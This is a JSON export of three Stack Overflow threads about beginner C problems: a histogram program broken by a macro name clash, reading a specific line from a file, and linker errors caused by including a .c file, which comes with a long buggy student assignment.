[{"tags": ["c", "histogram"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447285158, "post_id": 33661910, "comment_id": 55097420, "body": "What is <code>ch_grade</code> supposed to be?"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 2, "creation_date": 1447285303, "post_id": 33661910, "comment_id": 55097461, "body": "<code>#define ch_grade 32</code> : Use a different name. E.g <code>#define CH_Grade 32</code>"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1447285458, "post_id": 33661910, "comment_id": 55097512, "body": "<code>putchar(i);</code> You must be converted to a symbol."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1447287399, "post_id": 33661910, "comment_id": 55098074, "body": "Note that because you <code>#define ch_grade 32</code>, the compiler interprets <code>char ch_grade [32]</code> as <code>char 32 [32]</code>. You need to make sure that you use different names for different items."}], "answers": [{"tags": [], "owner": {"reputation": 1398, "user_id": 601409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/9ec12784ac7ae1a91bd223ae176a5244?s=128&d=identicon&r=PG&f=1", "display_name": "EkcenierK", "link": "https://stackoverflow.com/users/601409/ekcenierk"}, "is_accepted": false, "score": 2, "last_activity_date": 1447285261, "creation_date": 1447285261, "answer_id": 33661940, "question_id": 33661910, "link": "https://stackoverflow.com/questions/33661910/c-programming-histogram/33661940#33661940", "title": "C programming histogram", "body": "<p>You need to put you char literals each inside ' ', e.g.<code>'A', 'B'</code> etc.</p>\n"}], "owner": {"reputation": 1, "user_id": 5552659, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/340245871e2119132388178ad0bc87ee?s=128&d=identicon&r=PG&f=1", "display_name": "joe", "link": "https://stackoverflow.com/users/5552659/joe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 730, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1447285261, "creation_date": 1447285034, "question_id": 33661910, "link": "https://stackoverflow.com/questions/33661910/c-programming-histogram", "title": "C programming histogram", "body": "<p>I'm getting an error on line number 8 that it needs an expected identifier '(' before a numeric constant, but I can't seem to fix it.  Please help.  This code is supposed to take each grade and create a histogram.</p>\n\n<pre><code>/* Histogram of Frequency of Different Characters in Input */\n\n#include&lt;stdio.h&gt;\n#define ch_grade 32  \n\nint main(void)\n{\nchar ch_grade [32] = {A, B, C, D, f, I, b, C, d, F, I, a, C, D, F, I, A, B, D, F, I, A, B, c, I, D, F, F, A, B, a, b};\n\nint c,i,j;\n\nint character[ch_grade];\n\nfor(i=0;i&lt;ch_grade;++i)\n    character[i] = 0;\n\nwhile((c=getchar())!=EOF)\n    ++character[c];\n\nfor(i=0;i&lt;ch_grade;++i)\n{\n    putchar(i);\n\n    for(j=0;j&lt;character[i];++j)\n        putchar('*');\n\n    putchar('\\n');\n    }\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1447284923, "post_id": 33661837, "comment_id": 55097342, "body": "<code>fread()</code>? <code>fgets()</code> POSIX <code>getline()</code>? <code>fscanf()</code>? POSIX <code>read()</code>? <code>readv()</code>? You <i>do</i> have options, you know."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4901669"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447284971, "post_id": 33661837, "comment_id": 55097359, "body": "@EOF That&#39;s exactly why I am confused, I don&#39;t know what to use"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447285111, "post_id": 33661837, "comment_id": 55097403, "body": "@yobrobob Roll a dice. (And I&#39;m aware &quot;dice&quot; is plural, but nobody ever says &quot;roll a die&quot; in reality)"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447285125, "post_id": 33661837, "comment_id": 55097407, "body": "Well, that would depend on your usecase. What&#39;s special about the line you&#39;re looking for?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4901669"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447285151, "post_id": 33661837, "comment_id": 55097416, "body": "@immibis &#39;getline()&#39; seems like the easiest"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4901669"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447285199, "post_id": 33661837, "comment_id": 55097434, "body": "@EOF I want to copy that line (Without the newline) and check if chars that the user enters are in it."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447285242, "post_id": 33661837, "comment_id": 55097443, "body": "<i>What distinguishes the line from the other lines (if any) in the file</i>?"}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1447285904, "post_id": 33661837, "comment_id": 55097660, "body": "If your lines are fixed format records, you could use fseek to put the file pointer at the correct place in the file, and then use fread to read the line in."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4901669"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447285923, "post_id": 33661837, "comment_id": 55097667, "body": "@EOF the lines are just random words"}, {"owner": {"reputation": 1285, "user_id": 5003848, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/12b681a7a5cab103fa1ea1165685555b?s=128&d=identicon&r=PG&f=1", "display_name": "tonysdg", "link": "https://stackoverflow.com/users/5003848/tonysdg"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1447288870, "post_id": 33661837, "comment_id": 55098506, "body": "@immibis: I say &quot;roll a die&quot; all the time.  Your statement <code>segfaults</code>.  Sanitize your inputs ;)"}], "answers": [{"comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1447288641, "post_id": 33661918, "comment_id": 55098449, "body": "I guess that the OP imagined there was some &#39;easy&#39; way of reading indexed lines of text.  We know there is not, now so does OP:)"}], "tags": [], "owner": {"reputation": 154, "user_id": 3164339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/336d185d4f3d623614411c862f40c09e?s=128&d=identicon&r=PG&f=1", "display_name": "user3164339", "link": "https://stackoverflow.com/users/3164339/user3164339"}, "is_accepted": false, "score": 1, "last_activity_date": 1558207024, "last_edit_date": 1558207024, "creation_date": 1447285133, "answer_id": 33661918, "question_id": 33661837, "link": "https://stackoverflow.com/questions/33661837/c-read-a-specific-line-from-a-file/33661918#33661918", "title": "C read a specific line from a file", "body": "<p>this is an answer a simple google search could answer.  However, since I'm already typing I'll go ahead and answer this.</p>\n\n<p><a href=\"http://www.codingunit.com/c-tutorial-file-io-using-text-files\" rel=\"nofollow noreferrer\">http://www.codingunit.com/c-tutorial-file-io-using-text-files</a></p>\n\n<p>you need to read the lines and keep track of how many you have read.</p>\n\n<pre><code>char buf[1000];\n\nwhile (fgets(buf,1000, file) != NULL)\n    printf(\"%s\",buf);\n</code></pre>\n\n<p>you'll have to look into how fgets works to change this for your use, but this should easily get you to the solution.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4901669"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1467, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1558207024, "creation_date": 1447284708, "question_id": 33661837, "link": "https://stackoverflow.com/questions/33661837/c-read-a-specific-line-from-a-file", "title": "C read a specific line from a file", "body": "<p>I need to read line <code>x</code> from <code>file.txt</code> and store it in the string <code>string</code></p>\n\n<p>I am stumped and have no idea what to do, this is what I have</p>\n\n<pre><code>FILE *file = fopen(\"file.txt\", \"r\");\nint x = someLine;\n\nif (file == NULL) {\n    printf(\"Error! \\n\");\n    strcpy(string, \"ERROR\");\n    return;\n}\n\n\nfclose(file);\n</code></pre>\n"}, {"tags": ["c", "definition", "lnk2005"], "comments": [{"owner": {"reputation": 20231, "user_id": 1342730, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/36543a7316596ec6e930bc8c996bf14b?s=128&d=identicon&r=PG", "display_name": "mathematician1975", "link": "https://stackoverflow.com/users/1342730/mathematician1975"}, "edited": false, "score": 0, "creation_date": 1447284285, "post_id": 33661732, "comment_id": 55097128, "body": "Don&#39;t include the .h and the .c file in main.c - just include the .h file and make sure you compile both main.c and pa-1.c. Also google for the term &quot;header guards&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 2059, "user_id": 2759368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d03e2c110cced20e5bde6dc62146fcce?s=128&d=identicon&r=PG&f=1", "display_name": "nnn", "link": "https://stackoverflow.com/users/2759368/nnn"}, "is_accepted": true, "score": 1, "last_activity_date": 1447284883, "last_edit_date": 1447284883, "creation_date": 1447284326, "answer_id": 33661763, "question_id": 33661732, "link": "https://stackoverflow.com/questions/33661732/lnk1169-and-lnk2005-errors-in-c/33661763#33661763", "title": "LNK1169 and LNK2005 errors in C", "body": "<p>You should not include the <code>.c</code> file. Remove this line</p>\n\n<pre><code>#include \"pa-1.c\"\n</code></pre>\n\n<p>And compile all <code>.c</code> files, for example:</p>\n\n<pre><code>gcc main.c pa-1.c -o prog.exe\n</code></pre>\n\n<p>Edit: Didn't noticed you are using Visual Studio, in that case just adding all the files in the same project and building it should suffice. So ignore the above <code>gcc</code> command.</p>\n"}], "owner": {"reputation": 69, "user_id": 3562806, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/496e41b29395fcd4b19fee8722eb5a58?s=128&d=identicon&r=PG&f=1", "display_name": "user3562806", "link": "https://stackoverflow.com/users/3562806/user3562806"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 205, "favorite_count": 0, "accepted_answer_id": 33661763, "answer_count": 1, "score": 1, "last_activity_date": 1447284883, "creation_date": 1447284126, "question_id": 33661732, "link": "https://stackoverflow.com/questions/33661732/lnk1169-and-lnk2005-errors-in-c", "title": "LNK1169 and LNK2005 errors in C", "body": "<p>I'm getting the following errors when trying to compile my code:</p>\n\n<p>LNK1169: one or more multiply defined symbols found\nLNK2005: [function name] already defined in main.obj\n^^^ Error LNK2005 for every function</p>\n\n<p>Here's my current code:\nmain.c</p>\n\n<pre><code>#define _CRT_SECURE_NO_WARNINGS \u2013\n#pragma once\n#include \"pa-1.h\"\n#include \"pa-1.c\"\nint main()\n{\n    //Declaring an array\n    int list[3] = {0,0,0};\n    //Declaring variables\n    int n = 0;\n    int x = 0;\n    int r = 0;\n    int y = 0;\n    int z = 0; \n    int rotateNum = 0;\n    int searchRecur = 0; \n    int collatzNum = 0;\n    int average = 0;\n    bool results;\n    char brackets = \"\";\n    char lookFor = \"\";\n    char paragraph = \"\"; \n    char fString = \"\";\n    char sString = \"\";\n    char *e = \"\";\n    char *pattern = \"\"; \n    char *text = \"\";\n    char *s1 = \"\";\n    char *s2 = \"\";\n    char *s3 = \"\";\n\n    //Function 1\n    //Will see if input is an armstrong number\n    printf(\"Enter a number and the program will check to see if it's an armstrong number: \");\n    scanf(\"%d\", n);\n\n    results = f_armstrong(n);\n\n    if (results == true)\n    {\n        printf(\" is an armstrong number\");\n    }\n    else\n    {\n        printf(\"%d is not an armstrong number\", n);\n    }\n/*\n    //Function 2\n    //Will see if brackets are balanced\n    printf(\"Enter brackets and the program will check to see if they are in order: \");\n    scanf(\"%s\", brackets);\n\n    *e = brackets;\n\n    results = f_brackets(*e);\n\n    if (results == true)\n    {\n        printf(\"Your brackets are in order\");\n    }\n    else\n    {\n        printf(\"Your brackets are not in order\");\n    }\n\n    //Function 3\n    //Will see if input is a perfect number\n    printf(\"Enter a number and the program will check to see if it's a perfect number: \");\n    scanf(\"%d\", x);\n\n    results = f_perfect(x);\n\n    if (results == true)\n    {\n        printf(\"%d is a perfect number\", x);\n    }\n    else\n    {\n        printf(\"%d is not a perfect number\", x);\n    }\n\n    //Funtction 4\n    //Will rotate input by a number that is also given\n    printf(\"Enter a number that you want to rotate its digits: \");\n    scanf(\"%d\", n);\n    printf(\"Enter a number that you want to rotate by: \");\n    scanf(\"%d\", r);\n\n    rotateNum = f_rotate(n, r);\n\n    printf(\"The new number is: %d\", rotateNum);\n\n    //Funtction 5\n    //Will search for a pattern in a text\n    printf(\"Enter a text you want to search through: \");\n    scanf(\"%s\", paragraph);\n    printf(\"Enter a pattern you want to search for: \");\n    scanf(\"%s\", lookFor);\n\n    *text = paragraph;\n    *pattern = lookFor;\n\n    searchRecur = f_str_search(*pattern, *text);\n\n    printf(\"%s can be found in your text %D times\", *pattern, searchRecur);\n\n    //Funtction 6\n    //Will perform the Collatz conjucture on input\n    printf(\"Enter a number for the program to perform the Collatz conjucture to: \");\n    scanf(\"%d\", n);\n\n    collatzNum = f_collatz_count(n);\n\n    printf(\"It took %d iterations\", collatzNum);\n\n    //Funtction 7\n    //This function will take a number and create an array with the amount and perform other operation\n    printf(\"Enter a number to determine how many random numbers are generated: \");\n    scanf(\"%d\", n);\n\n    average = f_array(n);\n\n    printf(\"The numbers were randomly generated between 1-99 and multiplied by 2. The following number is the average of the (up to 5) numbers divisible by 3: %d\", average);\n\n    //Funtction 8\n    //This function will take two strings and put them into one, in shorter/larger/shorter order\n    printf(\"Enter the first text you want to forge with: \");\n    scanf(\"%s\", fString);\n    printf(\"Enter the second text you want to forge with: \");\n    scanf(\"%s\", sString);\n\n    *s1 = fString;\n    *s2 = sString;\n\n    f_strings(*s1, *s2, *s3);\n\n    printf(\"Your new string is: %s\", *s3);\n\n    //Function 9\n    //This will take three numbers and sort them in order\n    printf(\"The program will now take three numbers and sort them in assending order. Enter the first number: \");\n    scanf(\"%d\", x);\n    printf(\"Enter the second number: \");\n    scanf(\"%d\", y);\n    printf(\"Enter the third number: \");\n    scanf(\"%d\", z);\n\n    f_sort(x, y, z, *list);\n\n    printf(\"The numbers in order are: %d %d %d\",list[0], list[1], list[2]);\n\n    //Funtction 10\n    //This will look for a set of numbers that equate to the input, when cubed\n    printf(\"Enter a number and the program will see if a set of numbers cubed will equate to it: \");\n    scanf(\"%d\", n);\n\n    int * twoValues = f_cubed_sum(n);\n    if (twoValues[0] != NULL)\n    {\n        printf(\"The two values are: %d and %d\", twoValues[0], twoValues[1]);\n    }\n    else\n    {\n        printf(\"There is no pair of integers that satasfy the formula\");\n    }\n\n    free(twoValues);\n    */\n\n\n    return 0;\n}\n</code></pre>\n\n<p>pa-1.c:</p>\n\n<pre><code>#pragma once\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n#include \"pa-1.h\"\n\n\n/*\nThis function takes an integer n as a parameter.\nThe purpose of this function is to determine if n is an\n\"Armstrong Number\".\n*/\nbool f_armstrong(int n)\n{\n    int numLength;              //Holds how many digits are in n\n    int finalSum = 0;           //Holds the final test value to compare with n\n    int digits = 0;             //Holds the value of parameter n\n    int remainder;              //Holds the value of the remainder \n    int userNum = n;            //Holds the value of n\n\n                                // Count number of digits in n\n    while (userNum != 0)\n    {\n        digits++;\n\n        //Takes away a digit from n\n        userNum /= 10;\n    }\n\n    //Re-assign the variables\n    numLength = digits;\n    userNum = n;\n\n    //Test loop to determine if it's an Armstrong number\n    while (userNum != 0)\n    {\n        //Find digit in the number\n        remainder = userNum % 10;\n\n        //Exponential increase the digit and add it to the sum\n        finalSum += pow(remainder, digits);\n        userNum /= 10;\n    }\n\n    //If the test was true\n    if (finalSum == n)\n    {\n        return true;\n    }\n\n    //If the test fails\n    else\n    {\n        return false;\n    }\n}\n\n\n\n/*\nTHe user enters a string phrase into the function.\nThe function will then go through the string and count the\nnumber of open and closed brackets. If the sizes match it\nreturns true, if not it returns false.\n*/\nbool f_brackets(char *e)\n{\n    //Declaring variables\n    int brackLen;\n    int counter = 0;\n    int openCount = 0;\n    int closeCount = 0;\n    char curChar, brackets;\n    bool results = true;\n\n    brackets = *e;\n\n    //Getting the length of the string\n    brackLen = strlen(e);\n\n    while (counter &lt; brackLen &amp;&amp; results == true)\n    {\n        curChar = getchar(brackets);\n\n        if (curChar == '[')\n        {\n            openCount = openCount + 1;\n        }\n        else\n        {\n            closeCount = closeCount + 1;\n        }\n\n        if (closeCount &gt; openCount)\n        {\n            results = false;\n        }\n\n        counter = counter + 1;\n    }\n\n    return results;\n}\n\n/*\nThe user will enter a number theu want to test.\nThe function will then add up the sum of the divisors.\nIf the sum and number match it returns true, if not it\nreturns true.\n*/\nbool f_perfect(int x)\n{\n    int userNum = x;                    //Variable to hold the parameter value\n    int sum = 1;                        //Holds the final sum of perfect numbers\n\n                                        //Divided by the user's number\n                                        //Starts at 2 since all numbers are divisable by 1\n    int divisor = 2;\n\n    //While the user's number is greater then the divisor\n    while (divisor &lt; userNum)\n    {\n        //Int to hold the value\n        int test = userNum % divisor;\n\n        //If test is 0, then userNum is divisable\n        if (test == 0)\n        {\n            //Add the divisable to the overall sum\n            sum += divisor;\n        }\n\n        //Incrememnt \n        divisor++;\n    }\n\n    //If the sum of divisors is equal to the user's number\n    if (userNum == sum)\n    {\n        return true;\n    }\n\n    //If the sum of divisors is not equal to the user's number\n    else\n    {\n        return false;\n    }\n}\n\n\n/*\nThe purpose of this function is for the user to enter a number,\nand then they enter another number which the function uses to rotate\nthe values of their first number.\n*/\nint f_rotate(int n, int r)\n{\n    int number = n;                 //Holds the value of users number\n    const int mod = 10;             //Constant value used for modulus command\n    int rotater = r;                //Value to hold how many rotations user wants\n    int multiplier = 10;            //Variable that will be used for multiplications\n    int digits = 0;                 //Variable to hold how many values are in number\n    int finalNum = 0;               //Variable that holds the final rotated number\n\n                                    //For loop to determine how many numbers are in users entered value\n    for (int i = 0; number &gt; 0; i++)\n    {\n        //Remove a digit from the value and increment\n        number /= 10;\n        digits++;\n    }\n\n    //Loop that will increment multiplier by 10 until it has the same 0's as user number\n    for (int i = 1; i &lt; digits - rotater; i++)\n    {\n        multiplier *= 10;\n    }\n\n    //Reset number to original value\n    number = n;\n\n    //Loop until it's been rotated the correct amount of times\n    for (int i = 0; i &lt; rotater; i++)\n    {\n        //Temp value that will hold the value of a spot in the user's number\n        int temp;\n\n        //Mod 10 to get the digit by itself\n        temp = number % 10;\n\n        //Subtract the value from the number and get rid of a 0\n        number -= temp;\n        number /= 10;\n\n        //If the digit did not equal 0\n        if (temp != 0)\n        {\n            //Multiply the the value by the multiplier and add it to final num\n            finalNum += temp * multiplier;\n            multiplier *= 10;\n        }\n    }\n\n    //Add the numbers not being rotated to the final number\n    finalNum += number;\n\n    //Return the rotated number\n    return finalNum;\n}\n\n\n/*\nThe user enters a pattern that they would like to search for.\nThe user also enters a text that they want to check for patterns.\nThe function will return the amount of times it finds the pattern\nin the test.\n*/\nint f_str_search(char *pattern, char *text)\n{\n    int patSize = strlen(pattern);          //Varaible to hold size of pattern\n    int textSize = strlen(text);            //Varaible to hold size of text\n    int occurence = 0;                      //Variable to hold amount of times the pattern is matched\n    int patElement = 0;                     //Array element for pattern\n    int textElem = 0;                       //Array element for text\n    int match = 0;                          //Variable to hold how many matched elements are found\n\n                                            //While there's still chars left to test in the text string\n    while (textElem &lt; textSize)\n    {\n        //If the values in the element match\n        if (*(pattern + patElement) == *(text + textElem))\n        {\n            //Increment match and the pattern element\n            match++;\n            patElement++;\n        }\n\n        //If the values in the element do not match\n        else\n        {\n            //Reset match and go back to the first char in pattern\n            match = 0;\n            patElement = 0;;\n        }\n\n        //If matches equal size of pattern, pattern is found\n        if (match == patSize)\n        {\n            //Reset match and pattern element to continue checking\n            match = 0;\n            patElement = 0;\n\n            //Increment the occurence\n            occurence++;\n\n            //Decrement text element to start checking again in last element a match was found\n            textElem--;\n        }\n\n        //\n        textElem++;\n    }\n\n    return occurence;\n}\n\n\n/*\nThe user enters a natural number.\nThe program will use the \"The Collatz Conjecture\" and return\nthe amount of iterations it took to get the user's number to\nequal 1.\n*/\nint f_collatz_count(int n)\n{\n    int userNum = n;                //Variable to hold the user's number\n    int iteration = 0;              //Variable to hold amount of iterations\n\n                                    //While userNum is not 1\n    while (userNum != 1)\n    {\n        //testNum will hold the remainder of the number divided by 2\n        int testNum = userNum % 2;\n\n        //If the number was divisable by 2 (even)\n        if (testNum == 0)\n        {\n            //Divide number by 2 and increment iteration\n            userNum /= 2;\n            iteration++;\n        }\n\n        //If the number was not divisable by 2 (odd)\n        else\n        {\n            //Multiply the number by 3 and add 1.\n            userNum = (userNum * 3) + 1;\n            //Increment iterations\n            iteration++;\n        }\n    }\n\n    //Return total iterations\n    return iteration;\n}\n\n\n/*\nUser enters a number.\nThe function will add however many random numbers the user entered.\nIt will then multiply all the random numbers by 2, and will return the\naverage of the first 5 numbers divisable by 3.\n*/\nint f_array(int n)\n{\n\n    //Creating variables\n    int remainder, average;\n    int counter = 0;\n    int avgCount = 0;\n    int total = 0;\n    bool results = false;\n\n    //Creating arrayAn\n    int* A;\n    A = malloc(n * sizeof(int));\n\n    //Initializing random seed\n    srand(time(NULL));\n\n    //Populating array with random numbers\n    while (counter &lt; n)\n    {\n        A[counter] = rand() % 99 + 1;\n\n        counter = counter + 1;\n    }\n    //Resetting counter\n    counter = 0;\n\n    //Multiplying array by 2\n    while (counter &lt; n)\n    {\n        A[counter] = A[counter] * 2;\n\n        counter = counter + 1;\n    }\n\n    //Restting counter\n    counter = 0;\n\n    //Getting the average of first 5 numbers divisible by 3\n    while (counter &lt; n &amp;&amp; results == false)\n    {\n        //Checking if divisible by 3\n        remainder = A[counter] % 3;\n\n        if (remainder == 0)\n        {\n            total = total + A[counter];\n            avgCount = avgCount + 1;\n        }\n\n        if (avgCount = 5)\n        {\n            results = true;\n        }\n\n        counter = counter + 1;\n\n    }\n\n    average = total / avgCount;\n\n    free(A);\n\n    return average;\n\n}\n\n\n\n/*\nThe user enters two different strings.\nThe function will test to see which one is larger and then return a\ncombined string with the shorter string, the longer string, and the\nshorter string again.\n*/\nvoid f_strings(char *s1, char *s2, char *s3)\n{\n    //Declaring variables\n    int firstCount, secCount;\n\n\n    //Comparing the string lengths\n    firstCount = strlen(s1);\n    secCount = strlen(s2);\n\n    if (firstCount &gt; secCount)\n    {\n        *s3 = *s1 &lt;&lt; *s2 &lt;&lt; *s1;\n    }\n    else\n    {\n        *s3 = *s2 &lt;&lt; *s1 &lt;&lt; *s2;\n    }\n\n    return;\n}\n\n\n/*\nThe user enters 3 numbers.\nThe function then sorts those numbers and lists them in ascending\norder.\n*/\nvoid f_sort(int x, int y, int z, int *list)\n{\n    const int arraySize = 3;            //Constant for the size of array\n    int element = 0;                    //Holds numerical value for array element\n    int num1 = x;                       //Holds value of first entered number\n    int num2 = y;                       //Holds value of second entered number\n    int num3 = z;                       //Holds value of third entered number\n    int temp;                           //Holds value of number being swapped\n\n                                        //If the first number is larger then the second\n    if (num1 &gt; num2)\n    {\n        //Swap their values\n        temp = num2;\n        num2 = num1;\n        num1 = temp;\n    }\n\n    //If the first number is larger then the third\n    if (num1 &gt; num3)\n    {\n        //Swap their values\n        temp = num3;\n        num3 = num1;\n        num1 = temp;\n    }\n\n    //If the second number is larger then the third\n    if (num2 &gt; num3)\n    {\n        //Swap their values\n        temp = num3;\n        num3 = num2;\n        num2 = temp;\n    }\n\n    //Allocate memory\n    list = (int *)malloc(arraySize);\n\n    //Add the values into the array in ascending order\n    *(list + element) = num1;\n    element++;\n    *(list + element) = num2;\n    element++;\n    *(list + element) = num3;\n\n    printf(\"%s \\n\", \"Here is your numbers sorted in ascending order:\");\n\n    //Loops until all 3 values are printed\n    for (int i = 0; i &lt; arraySize; i++)\n    {\n        printf(\"%d \\n\", *(list + i));\n    }\n}\n\n\n/*\nThe user enters a number.\nThe function will test if the cubed sum of 2 numbers is equal\nto the number they entered.\n*/\nint *f_cubed_sum(int n)\n{\n    //Variable to hold the max value the program can go to\n    const int maxValue = cbrt(n);\n\n    const int exponant = 3;             //Constant exponant value\n    int element = 0;                        //Holds value of array\n    int test1 = 0;                          //Value of first number cubed\n    int test2 = 0;                          //Value of second number cubed\n    int *pair1;\n    int *pair2;\n    int *pairs;\n    int totalPairs = 0;                   //Holds if pairs have been found\n\n    pair1 = (int *)malloc(5 * maxValue);\n    pair2 = (int *)malloc(5 * maxValue);\n\n    //While the first test number is less then or equal to max value\n    while (test1 &lt;= maxValue)\n    {\n        //Reset second test number to 0\n        test2 = 0;\n\n        //While the second test number is less then or equal to max value\n        while (test2 &lt;= maxValue)\n        {\n            //Sum of the two test numbers\n            int sum = 0;\n\n            //Cube the test numbers and add them to sum\n            sum += pow(test1, exponant);\n            sum += pow(test2, exponant);\n\n            //If sum is equal to users number\n            if (sum == n)\n            {\n                //If one of the test numbers is 0\n                if (test1 == 0)\n                {\n                    *(pair1 + element) = 0;\n                    *(pair2 + element) = test2;\n                    totalPairs += 2;\n                }\n\n                else if (test2 == 0)\n                {\n                    *(pair1 + element) = test1;\n                    *(pair2 + element) = 0;\n                    totalPairs += 2;\n                }\n\n                else\n                {\n                    *(pair1 + element) = test1;\n                    *(pair2 + element) = test2;\n\n                    element++;\n\n                    totalPairs += 2;\n                }\n            }\n            //Increment test number 2\n            test2++;\n        }\n        //Increment test number 1\n        test1++;\n    }\n\n    //If no pairs were found\n    if (totalPairs == 0)\n    {\n        //Free memory and return NULL\n        free(pair1);\n        free(pair2);\n        return NULL;\n    }\n\n    //If there were pairs found\n    else\n    {\n        int pairElement = 0;\n        int pairsElement = 0;\n        pairs = (int *)malloc(100 * totalPairs);\n\n        for (int i = 0; pairElement &lt; sizeof(pair1); i++)\n        {\n            if (*(pair2 + pairElement) != 0 &amp;&amp; *(pair1 + pairElement) != 0)\n            {\n                *(pairs + pairsElement) = *(pair1 + pairElement);\n                pairsElement++;\n                *(pairs + pairsElement) = *(pair2 + pairElement);\n                pairsElement++;\n                pairElement++;\n            }\n\n            else\n            {\n                pairElement++;\n            }\n        }\n\n        //Return array of pairs\n        return pairs;\n    }\n\n\n}\n</code></pre>\n\n<p>pa-1.h</p>\n\n<pre><code>#pragma once\n// define a boolean type to use in the functions\n\n#ifndef _BOOL_TYPE_\n#define _BOOL_TYPE_\ntypedef enum { false, true } bool;\n#endif\n\nbool f_armstrong(int n);\nbool f_brackets(char *e);\nbool f_perfect(int x);\nint f_rotate(int n, int r);\nint f_str_search(char *pattern, char *text);\nint f_collatz_count(int n);\nint f_array(int n);\nvoid f_strings(char *s1, char *s2, char *s3);\nvoid f_sort(int x, int y, int z, int *list);\nint *f_cubed_sum(int 